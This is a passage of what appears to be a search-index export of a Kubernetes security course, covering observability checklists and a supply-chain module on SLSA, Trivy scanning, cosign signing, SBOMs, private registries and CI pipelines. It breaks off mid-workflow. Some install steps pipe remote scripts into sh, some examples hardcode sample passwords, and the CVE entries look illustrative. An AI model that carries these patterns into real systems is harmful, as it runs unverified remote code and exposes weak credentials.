<li>[ ] Centralized logging configured</li> <li>[ ] Audit logs collected</li> <li>[ ] Sensitive data redacted</li> <li>[ ] Retention policies enforced</li> <li> <p>[ ] Log access controlled via RBAC</p> </li> <li> <p>[ ] Security Alerts</p> </li> <li>[ ] Authentication failure alerts</li> <li>[ ] Authorization failure alerts</li> <li>[ ] Privileged pod alerts</li> <li>[ ] RBAC modification alerts</li> <li>[ ] Secret access alerts</li> <li> <p>[ ] Pod exec alerts</p> </li> <li> <p>[ ] Compliance</p> </li> <li>[ ] Audit logs retained per policy</li> <li>[ ] Access logs available</li> <li>[ ] Security events monitored</li> <li>[ ] Incident response procedures defined</li> </ul>"},{"location":"08-observability/#11-references","title":"11. References","text":""},{"location":"08-observability/#official-documentation","title":"Official Documentation","text":"<ol> <li>Kubernetes Monitoring Architecture</li> <li> <p>https://kubernetes.io/docs/tasks/debug/debug-cluster/resource-metrics-pipeline/</p> </li> <li> <p>Kubernetes Audit Logging</p> </li> <li>https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/</li> </ol>"},{"location":"08-observability/#prometheus","title":"Prometheus","text":"<ol> <li>Prometheus Documentation</li> <li> <p>https://prometheus.io/docs/</p> </li> <li> <p>kube-prometheus-stack</p> </li> <li> <p>https://github.com/prometheus-operator/kube-prometheus</p> </li> <li> <p>Prometheus Best Practices</p> </li> <li>https://prometheus.io/docs/practices/naming/</li> </ol>"},{"location":"08-observability/#logging","title":"Logging","text":"<ol> <li>Fluent Bit Documentation</li> <li> <p>https://docs.fluentbit.io/</p> </li> <li> <p>Grafana Loki</p> </li> <li>https://grafana.com/docs/loki/</li> </ol>"},{"location":"08-observability/#tracing","title":"Tracing","text":"<ol> <li>OpenTelemetry</li> <li> <p>https://opentelemetry.io/docs/</p> </li> <li> <p>Jaeger</p> </li> <li>https://www.jaegertracing.io/docs/</li> </ol>"},{"location":"08-observability/#security","title":"Security","text":"<ol> <li>CNCF Security TAG - Observability<ul> <li>https://github.com/cncf/tag-security/tree/main/security-whitepaper</li> </ul> </li> </ol>"},{"location":"08-observability/#next-steps","title":"Next Steps","text":"<p>Continue to Module 09: Supply Chain and Image Security to learn about securing container images, software supply chain, and CI/CD pipelines.</p> <p>Module Completion Status: \u2705 Complete</p>"},{"location":"09-supply-chain/","title":"Module 09: Supply Chain and Image Security","text":""},{"location":"09-supply-chain/#overview","title":"Overview","text":"<p>Estimated Time: 6-7 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 01 - Kubernetes Basics - Module 06 - Pod Security - Module 07 - Admission Control and Policy - Understanding of Docker/container images and CI/CD concepts</p> <p>Software supply chain security is critical for protecting against compromised dependencies, malicious images, and supply chain attacks. This module covers the SLSA framework, container image scanning with Trivy, image signing with cosign, admission control for image verification, SBOM generation, and secure CI/CD pipeline patterns. Based on SLSA, NIST SP 800-218, and CNCF supply chain security best practices.</p>"},{"location":"09-supply-chain/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand software supply chain threat models and SLSA framework</li> <li>Scan container images for vulnerabilities using Trivy</li> <li>Sign and verify container images with cosign and Sigstore</li> <li>Generate and validate Software Bill of Materials (SBOM)</li> <li>Implement admission controllers for image verification</li> <li>Configure private container registries securely</li> <li>Build secure CI/CD pipelines with GitHub Actions</li> <li>Apply supply chain security best practices</li> <li>Detect and respond to supply chain compromises</li> <li>Implement zero-trust artifact verification</li> </ol>"},{"location":"09-supply-chain/#1-software-supply-chain-security","title":"1. Software Supply Chain Security","text":""},{"location":"09-supply-chain/#11-supply-chain-threat-model","title":"1.1 Supply Chain Threat Model","text":"<pre><code>graph LR\n    A[Source Code] --&gt;|Compromise| B[Build System]\n    B --&gt;|Malicious Dependency| C[Artifacts]\n    C --&gt;|Unsigned Image| D[Container Registry]\n    D --&gt;|No Verification| E[Kubernetes Cluster]\n\n    A --&gt;|Backdoor| F[Compromised App]\n    B --&gt;|Injection| F\n    C --&gt;|Tampering| F\n    D --&gt;|Substitution| F\n    E --&gt;|Runtime Attack| F\n\n    style F fill:#ff6b6b</code></pre> <p>Common Attack Vectors:</p> <ol> <li>Source Code Compromise</li> <li>Malicious commits</li> <li>Compromised developer accounts</li> <li> <p>Backdoored dependencies</p> </li> <li> <p>Build System Compromise</p> </li> <li>Malicious build scripts</li> <li>Compromised CI/CD pipelines</li> <li> <p>Stolen secrets</p> </li> <li> <p>Artifact Tampering</p> </li> <li>Modified container images</li> <li>Unsigned artifacts</li> <li> <p>Registry compromise</p> </li> <li> <p>Deployment Attacks</p> </li> <li>Runtime image substitution</li> <li>Privilege escalation</li> <li>Supply chain injection</li> </ol>"},{"location":"09-supply-chain/#12-slsa-framework","title":"1.2 SLSA Framework","text":"<p>Supply chain Levels for Software Artifacts (SLSA) defines security levels:</p> Level Requirements Protection SLSA 0 No guarantees None SLSA 1 Build process documented Basic provenance SLSA 2 Tamper-resistant build service Signed provenance SLSA 3 Hardened build platform Verified provenance SLSA 4 Two-party review Maximum trust <p>SLSA Provenance: <pre><code>{\n  \"_type\": \"https://in-toto.io/Statement/v0.1\",\n  \"subject\": [\n    {\n      \"name\": \"registry.example.com/app\",\n      \"digest\": {\n        \"sha256\": \"abc123...\"\n      }\n    }\n  ],\n  \"predicateType\": \"https://slsa.dev/provenance/v0.2\",\n  \"predicate\": {\n    \"builder\": {\n      \"id\": \"https://github.com/Attestations/GitHubActionsWorkflow@v1\"\n    },\n    \"buildType\": \"https://github.com/Attestations/GitHubActionsWorkflow@v1\",\n    \"invocation\": {\n      \"configSource\": {\n        \"uri\": \"git+https://github.com/org/repo@refs/heads/main\",\n        \"digest\": {\n          \"sha1\": \"def456...\"\n        }\n      }\n    },\n    \"metadata\": {\n      \"buildStartedOn\": \"2024-01-15T10:00:00Z\",\n      \"buildFinishedOn\": \"2024-01-15T10:15:00Z\"\n    },\n    \"materials\": [\n      {\n        \"uri\": \"git+https://github.com/org/repo\",\n        \"digest\": {\n          \"sha1\": \"def456...\"\n        }\n      }\n    ]\n  }\n}\n</code></pre></p>"},{"location":"09-supply-chain/#13-defense-in-depth-strategy","title":"1.3 Defense in Depth Strategy","text":"<pre><code>graph TB\n    A[Source] --&gt; B[Build]\n    B --&gt; C[Registry]\n    C --&gt; D[Deploy]\n\n    A --&gt;|Git Commit Signing| A1[Verified Source]\n    B --&gt;|Vulnerability Scan| B1[Secure Build]\n    B --&gt;|Image Signing| B2[Signed Artifact]\n    C --&gt;|Access Control| C1[Protected Registry]\n    D --&gt;|Admission Control| D1[Verified Deployment]\n\n    A1 --&gt; E[Supply Chain Security]\n    B1 --&gt; E\n    B2 --&gt; E\n    C1 --&gt; E\n    D1 --&gt; E\n\n    style E fill:#6bcf7f</code></pre>"},{"location":"09-supply-chain/#2-container-image-scanning-with-trivy","title":"2. Container Image Scanning with Trivy","text":""},{"location":"09-supply-chain/#21-trivy-overview","title":"2.1 Trivy Overview","text":"<p>Trivy is a comprehensive vulnerability scanner for containers, filesystems, and git repositories.</p> <p>Scan Types: - Vulnerability scanning - OS and application packages - Misconfiguration detection - Kubernetes, Docker, Terraform - Secret detection - API keys, passwords, tokens - License scanning - Software license compliance - SBOM generation - Software Bill of Materials</p>"},{"location":"09-supply-chain/#22-installing-trivy","title":"2.2 Installing Trivy","text":"<pre><code># Install Trivy CLI\nwget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -\necho \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee /etc/apt/sources.list.d/trivy.list\nsudo apt-get update\nsudo apt-get install trivy\n\n# Or using binary\ncurl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin\n\n# Verify installation\ntrivy --version\n</code></pre>"},{"location":"09-supply-chain/#23-scanning-container-images","title":"2.3 Scanning Container Images","text":"<p>Basic Image Scan: <pre><code># Scan public image\ntrivy image nginx:1.25\n\n# Scan with specific severity\ntrivy image --severity CRITICAL,HIGH nginx:1.25\n\n# Scan private registry image\ntrivy image --username myuser --password mypass registry.example.com/app:v1.0\n\n# Output formats\ntrivy image --format json --output result.json nginx:1.25\ntrivy image --format sarif --output result.sarif nginx:1.25\ntrivy image --format cyclonedx --output sbom.json nginx:1.25\n</code></pre></p> <p>Scan with Exit Code: <pre><code># Fail on critical vulnerabilities\ntrivy image --exit-code 1 --severity CRITICAL nginx:1.25\n\n# Fail if vulnerability count exceeds threshold\ntrivy image --exit-code 1 --severity HIGH,CRITICAL nginx:1.25\n</code></pre></p> <p>Example Output: <pre><code>nginx:1.25 (debian 12.4)\n=======================\nTotal: 120 (UNKNOWN: 0, LOW: 65, MEDIUM: 40, HIGH: 12, CRITICAL: 3)\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Library     \u2502 Vulnerability  \u2502 Severity \u2502 Installed Version \u2502 Fixed Version \u2502             Title                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 openssl       \u2502 CVE-2024-0001  \u2502 CRITICAL \u2502 3.0.11-1          \u2502 3.0.11-2      \u2502 OpenSSL: remote code execution     \u2502\n\u2502 libssl3       \u2502 CVE-2024-0001  \u2502 CRITICAL \u2502 3.0.11-1          \u2502 3.0.11-2      \u2502 OpenSSL: remote code execution     \u2502\n\u2502 curl          \u2502 CVE-2024-0002  \u2502 HIGH     \u2502 7.88.1-10         \u2502 7.88.1-11     \u2502 curl: buffer overflow              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p>"},{"location":"09-supply-chain/#24-scanning-kubernetes-manifests","title":"2.4 Scanning Kubernetes Manifests","text":"<pre><code># Scan Kubernetes YAML\ntrivy config deployment.yaml\n\n# Scan entire directory\ntrivy config ./kubernetes/\n\n# Scan with policy\ntrivy config --policy ./policies/ ./kubernetes/\n</code></pre> <p>Example Misconfigurations: <pre><code>deployment.yaml (kubernetes)\n============================\nTests: 28 (SUCCESSES: 20, FAILURES: 8)\nFailures: 8 (UNKNOWN: 0, LOW: 2, MEDIUM: 3, HIGH: 2, CRITICAL: 1)\n\nCRITICAL: Container is running as root\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nContainer 'app' is running as root user\n\nSee https://avd.aquasec.com/misconfig/ksv012\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n deployment.yaml:15-20\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  15 \u250c   containers:\n  16 \u2502   - name: app\n  17 \u2502     image: myapp:latest\n  18 \u2502     # No securityContext defined\n  19 \u2502     ports:\n  20 \u2514     - containerPort: 8080\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre></p>"},{"location":"09-supply-chain/#25-trivy-in-cicd","title":"2.5 Trivy in CI/CD","text":"<p>GitHub Actions: <pre><code>name: Container Scan\non: [push, pull_request]\n\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v4\n\n    - name: Build image\n      run: docker build -t myapp:${{ github.sha }} .\n\n    - name: Run Trivy vulnerability scanner\n      uses: aquasecurity/trivy-action@master\n      with:\n        image-ref: myapp:${{ github.sha }}\n        format: 'sarif'\n        output: 'trivy-results.sarif'\n        severity: 'CRITICAL,HIGH'\n        exit-code: '1'\n\n    - name: Upload Trivy results to GitHub Security\n      uses: github/codeql-action/upload-sarif@v2\n      if: always()\n      with:\n        sarif_file: 'trivy-results.sarif'\n</code></pre></p> <p>GitLab CI: <pre><code>image_scan:\n  stage: test\n  image:\n    name: aquasec/trivy:latest\n    entrypoint: [\"\"]\n  script:\n    - trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  only:\n    - merge_requests\n    - main\n</code></pre></p>"},{"location":"09-supply-chain/#26-trivy-operator-for-kubernetes","title":"2.6 Trivy Operator for Kubernetes","text":"<p>Deploy Trivy as an operator to continuously scan cluster resources:</p> <pre><code># Install Trivy Operator\nkubectl apply -f https://raw.githubusercontent.com/aquasecurity/trivy-operator/main/deploy/static/trivy-operator.yaml\n\n# Verify installation\nkubectl get pods -n trivy-system\n\n# View vulnerability reports\nkubectl get vulnerabilityreports -A\nkubectl get configauditreports -A\n</code></pre> <p>Example VulnerabilityReport: <pre><code>apiVersion: aquasecurity.github.io/v1alpha1\nkind: VulnerabilityReport\nmetadata:\n  name: deployment-myapp\n  namespace: production\nspec:\n  vulnerabilities:\n  - vulnerabilityID: CVE-2024-0001\n    severity: CRITICAL\n    title: OpenSSL remote code execution\n    installedVersion: 3.0.11-1\n    fixedVersion: 3.0.11-2\n    resource: openssl\n</code></pre></p>"},{"location":"09-supply-chain/#3-image-signing-with-cosign","title":"3. Image Signing with cosign","text":""},{"location":"09-supply-chain/#31-cosign-overview","title":"3.1 cosign Overview","text":"<p>cosign is a tool for signing and verifying container images using Sigstore.</p> <p>Key Features: - Sign container images - Verify signatures - Attach SBOMs and attestations - Keyless signing with OIDC - Hardware security module (HSM) support</p>"},{"location":"09-supply-chain/#32-installing-cosign","title":"3.2 Installing cosign","text":"<pre><code># Install cosign\ncurl -LO https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64\nsudo mv cosign-linux-amd64 /usr/local/bin/cosign\nsudo chmod +x /usr/local/bin/cosign\n\n# Verify installation\ncosign version\n</code></pre>"},{"location":"09-supply-chain/#33-generating-key-pairs","title":"3.3 Generating Key Pairs","text":"<p>Generate Keys: <pre><code># Generate key pair (passphrase protected)\ncosign generate-key-pair\n\n# Output: cosign.key (private), cosign.pub (public)\n\n# Store private key securely\nkubectl create secret generic cosign-key \\\n  --from-file=cosign.key=cosign.key \\\n  -n signing-system\n</code></pre></p> <p>Using Cloud KMS: <pre><code># Google Cloud KMS\ncosign generate-key-pair --kms gcpkms://projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY\n\n# AWS KMS\ncosign generate-key-pair --kms awskms:///arn:aws:kms:REGION:ACCOUNT:key/KEY-ID\n\n# Azure Key Vault\ncosign generate-key-pair --kms azurekms://VAULT-NAME.vault.azure.net/keys/KEY-NAME/KEY-VERSION\n</code></pre></p>"},{"location":"09-supply-chain/#34-signing-images","title":"3.4 Signing Images","text":"<p>Sign with Key Pair: <pre><code># Build and push image\ndocker build -t registry.example.com/app:v1.0 .\ndocker push registry.example.com/app:v1.0\n\n# Sign image\ncosign sign --key cosign.key registry.example.com/app:v1.0\n\n# Sign with annotations\ncosign sign --key cosign.key \\\n  -a author=security-team \\\n  -a build-date=$(date -u +%Y-%m-%dT%H:%M:%SZ) \\\n  registry.example.com/app:v1.0\n</code></pre></p> <p>Keyless Signing (Sigstore): <pre><code># Sign using OIDC (GitHub, Google, Microsoft)\ncosign sign registry.example.com/app:v1.0\n\n# This opens browser for authentication\n# Signature stored in transparency log\n</code></pre></p> <p>Verify Signature: <pre><code># Verify with public key\ncosign verify --key cosign.pub registry.example.com/app:v1.0\n\n# Verify keyless signature\ncosign verify \\\n  --certificate-identity=user@example.com \\\n  --certificate-oidc-issuer=https://github.com/login/oauth \\\n  registry.example.com/app:v1.0\n</code></pre></p>"},{"location":"09-supply-chain/#35-attaching-attestations","title":"3.5 Attaching Attestations","text":"<p>Generate and Attach SBOM: <pre><code># Generate SBOM with Syft\nsyft packages registry.example.com/app:v1.0 -o spdx-json &gt; sbom.spdx.json\n\n# Attach SBOM to image\ncosign attach sbom --sbom sbom.spdx.json registry.example.com/app:v1.0\n\n# Attest SBOM (signed)\ncosign attest --predicate sbom.spdx.json --key cosign.key registry.example.com/app:v1.0\n\n# Verify attestation\ncosign verify-attestation --key cosign.pub registry.example.com/app:v1.0\n</code></pre></p> <p>Custom Attestations: <pre><code># Create custom attestation\ncat &gt; attestation.json &lt;&lt;EOF\n{\n  \"predicateType\": \"https://example.com/security-scan/v1\",\n  \"predicate\": {\n    \"scanned\": true,\n    \"scanner\": \"trivy\",\n    \"vulnerabilities\": {\n      \"critical\": 0,\n      \"high\": 2\n    },\n    \"timestamp\": \"2024-01-15T10:00:00Z\"\n  }\n}\nEOF\n\n# Attach attestation\ncosign attest --predicate attestation.json --key cosign.key registry.example.com/app:v1.0\n</code></pre></p>"},{"location":"09-supply-chain/#36-image-verification-in-kubernetes","title":"3.6 Image Verification in Kubernetes","text":"<p>Kyverno Policy for Image Verification: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: verify-image-signatures\nspec:\n  validationFailureAction: Enforce\n  webhookTimeoutSeconds: 30\n  rules:\n  - name: verify-signature\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    verifyImages:\n    - imageReferences:\n      - \"registry.example.com/*\"\n      attestors:\n      - count: 1\n        entries:\n        - keys:\n            publicKeys: |-\n              -----BEGIN PUBLIC KEY-----\n              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...\n              -----END PUBLIC KEY-----\n</code></pre></p> <p>Sigstore Policy Controller: <pre><code># Install Sigstore Policy Controller\nkubectl apply -f https://github.com/sigstore/policy-controller/releases/latest/download/policy-controller.yaml\n\n# Create ClusterImagePolicy\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: policy.sigstore.dev/v1beta1\nkind: ClusterImagePolicy\nmetadata:\n  name: signed-images-policy\nspec:\n  images:\n  - glob: \"registry.example.com/**\"\n  authorities:\n  - key:\n      data: |\n        -----BEGIN PUBLIC KEY-----\n        MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...\n        -----END PUBLIC KEY-----\nEOF\n</code></pre></p>"},{"location":"09-supply-chain/#4-software-bill-of-materials-sbom","title":"4. Software Bill of Materials (SBOM)","text":""},{"location":"09-supply-chain/#41-sbom-overview","title":"4.1 SBOM Overview","text":"<p>An SBOM is a comprehensive inventory of software components, dependencies, and metadata.</p> <p>SBOM Formats: - SPDX - Software Package Data Exchange (ISO standard) - CycloneDX - OWASP standard for supply chain security - SWID - Software Identification Tags (ISO/IEC 19770-2)</p>"},{"location":"09-supply-chain/#42-generating-sboms-with-syft","title":"4.2 Generating SBOMs with Syft","text":"<pre><code># Install Syft\ncurl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin\n\n# Generate SBOM\nsyft packages registry.example.com/app:v1.0 -o spdx-json &gt; sbom.spdx.json\nsyft packages registry.example.com/app:v1.0 -o cyclonedx-json &gt; sbom.cyclonedx.json\n\n# Generate from local image\nsyft packages alpine:latest -o table\n\n# Generate from directory\nsyft packages dir:./app -o spdx-json\n</code></pre> <p>Example SPDX SBOM: <pre><code>{\n  \"spdxVersion\": \"SPDX-2.3\",\n  \"dataLicense\": \"CC0-1.0\",\n  \"SPDXID\": \"SPDXRef-DOCUMENT\",\n  \"name\": \"registry.example.com/app:v1.0\",\n  \"packages\": [\n    {\n      \"SPDXID\": \"SPDXRef-Package-openssl\",\n      \"name\": \"openssl\",\n      \"versionInfo\": \"3.0.11-1\",\n      \"supplier\": \"Organization: Debian\",\n      \"licenseConcluded\": \"Apache-2.0\",\n      \"externalRefs\": [\n        {\n          \"referenceCategory\": \"SECURITY\",\n          \"referenceType\": \"cpe23Type\",\n          \"referenceLocator\": \"cpe:2.3:a:openssl:openssl:3.0.11:*:*:*:*:*:*:*\"\n        }\n      ]\n    }\n  ]\n}\n</code></pre></p>"},{"location":"09-supply-chain/#43-sbom-analysis","title":"4.3 SBOM Analysis","text":"<p>Scan SBOM for Vulnerabilities: <pre><code># Scan SBOM with Trivy\ntrivy sbom sbom.spdx.json\n\n# Scan SBOM with Grype\ngrype sbom:sbom.spdx.json\n</code></pre></p> <p>Query SBOM: <pre><code># Extract specific information\njq '.packages[] | select(.name==\"openssl\")' sbom.spdx.json\n\n# List all licenses\njq '.packages[].licenseConcluded' sbom.spdx.json | sort -u\n\n# Count packages\njq '.packages | length' sbom.spdx.json\n</code></pre></p>"},{"location":"09-supply-chain/#44-sbom-distribution","title":"4.4 SBOM Distribution","text":"<p>Attach to Container Image: <pre><code># Using cosign\ncosign attach sbom --sbom sbom.spdx.json registry.example.com/app:v1.0\n\n# Download SBOM\ncosign download sbom registry.example.com/app:v1.0 &gt; downloaded-sbom.json\n</code></pre></p> <p>Store in OCI Registry: <pre><code># Using ORAS\noras push registry.example.com/app:v1.0-sbom \\\n  --artifact-type application/spdx+json \\\n  sbom.spdx.json:application/spdx+json\n</code></pre></p>"},{"location":"09-supply-chain/#5-private-registry-security","title":"5. Private Registry Security","text":""},{"location":"09-supply-chain/#51-docker-registry","title":"5.1 Docker Registry","text":"<p>Deploy Secure Docker Registry: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: docker-registry\n  namespace: registry\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: docker-registry\n  template:\n    metadata:\n      labels:\n        app: docker-registry\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        fsGroup: 1000\n      containers:\n      - name: registry\n        image: registry:2.8\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        env:\n        # Authentication\n        - name: REGISTRY_AUTH\n          value: htpasswd\n        - name: REGISTRY_AUTH_HTPASSWD_REALM\n          value: \"Registry Realm\"\n        - name: REGISTRY_AUTH_HTPASSWD_PATH\n          value: /auth/htpasswd\n\n        # TLS\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/tls.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/tls.key\n\n        # Storage\n        - name: REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY\n          value: /var/lib/registry\n\n        ports:\n        - containerPort: 5000\n\n        volumeMounts:\n        - name: registry-data\n          mountPath: /var/lib/registry\n        - name: certs\n          mountPath: /certs\n          readOnly: true\n        - name: auth\n          mountPath: /auth\n          readOnly: true\n\n      volumes:\n      - name: registry-data\n        persistentVolumeClaim:\n          claimName: registry-data\n      - name: certs\n        secret:\n          secretName: registry-tls\n      - name: auth\n        secret:\n          secretName: registry-auth\n</code></pre></p> <p>Generate htpasswd: <pre><code># Create htpasswd file\ndocker run --rm --entrypoint htpasswd httpd:2 -Bbn admin SecurePass123! &gt; htpasswd\n\n# Create secret\nkubectl create secret generic registry-auth \\\n  --from-file=htpasswd=htpasswd \\\n  -n registry\n</code></pre></p>"},{"location":"09-supply-chain/#52-harbor-registry","title":"5.2 Harbor Registry","text":"<p>Harbor is an enterprise-grade registry with security features built-in.</p> <p>Install Harbor with Helm: <pre><code># Add Harbor Helm repository\nhelm repo add harbor https://helm.goharbor.io\nhelm repo update\n\n# Install Harbor\nhelm install harbor harbor/harbor \\\n  --namespace harbor \\\n  --create-namespace \\\n  --set expose.type=loadBalancer \\\n  --set expose.tls.enabled=true \\\n  --set expose.tls.certSource=secret \\\n  --set expose.tls.secret.secretName=harbor-tls \\\n  --set externalURL=https://harbor.example.com \\\n  --set harborAdminPassword=SecurePassword123! \\\n  --set database.type=external \\\n  --set database.external.host=postgres.database.svc \\\n  --set trivy.enabled=true \\\n  --set notary.enabled=true\n</code></pre></p> <p>Harbor Features: - Image vulnerability scanning (Trivy integration) - Image signing and verification (Notary/cosign) - RBAC and project-based access control - Image replication - Webhook notifications - Audit logging</p>"},{"location":"09-supply-chain/#53-image-pull-secrets","title":"5.3 Image Pull Secrets","text":"<p>Create Docker Registry Secret: <pre><code># Create image pull secret\nkubectl create secret docker-registry regcred \\\n  --docker-server=registry.example.com \\\n  --docker-username=myuser \\\n  --docker-password=mypass \\\n  --docker-email=user@example.com \\\n  -n production\n\n# Use in pod\nkubectl patch serviceaccount default \\\n  -p '{\"imagePullSecrets\": [{\"name\": \"regcred\"}]}' \\\n  -n production\n</code></pre></p> <p>Deployment with Image Pull Secret: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  template:\n    spec:\n      imagePullSecrets:\n      - name: regcred\n      containers:\n      - name: app\n        image: registry.example.com/app:v1.0\n</code></pre></p>"},{"location":"09-supply-chain/#6-secure-cicd-pipelines","title":"6. Secure CI/CD Pipelines","text":""},{"location":"09-supply-chain/#61-secure-cicd-architecture","title":"6.1 Secure CI/CD Architecture","text":"<pre><code>graph TB\n    A[Source Code] --&gt; B[Git Commit]\n    B --&gt; C[CI Trigger]\n    C --&gt; D[Checkout Code]\n    D --&gt; E[Dependency Scan]\n    E --&gt; F[Build Image]\n    F --&gt; G[Vulnerability Scan]\n    G --&gt; H[Sign Image]\n    H --&gt; I[Push to Registry]\n    I --&gt; J[Deploy to K8s]\n\n    E --&gt;|Fail on Vuln| K[Block Build]\n    G --&gt;|Critical Vuln| K\n    J --&gt;|Verify Signature| L[Admission Control]\n\n    style K fill:#ff6b6b\n    style L fill:#6bcf7f</code></pre>"},{"location":"09-supply-chain/#62-github-actions-secure-pipeline","title":"6.2 GitHub Actions Secure Pipeline","text":"<p>Complete Secure Pipeline: <pre><code>name: Secure Build and Deploy\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\nenv:\n  REGISTRY: registry.example.com\n  IMAGE_NAME: myapp\n\njobs:\n  security-scan:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      security-events: write\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v4\n\n    - name: Run Trivy vulnerability scanner in repo mode\n      uses: aquasecurity/trivy-action@master\n      with:\n        scan-type: 'fs'\n        scan-ref: '.'\n        format: 'sarif'\n        output: 'trivy-results.sarif'\n\n    - name: Upload Trivy results to GitHub Security tab\n      uses: github/codeql-action/upload-sarif@v2\n      with:\n        sarif_file: 'trivy-results.sarif'\n\n  build:\n    needs: security-scan\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n      id-token: write  # For cosign keyless signing\n\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v4\n\n    - name: Set up Docker Buildx\n      uses: docker/setup-buildx-action@v3\n\n    - name: Log in to container registry\n      uses: docker/login-action@v3\n      with:\n     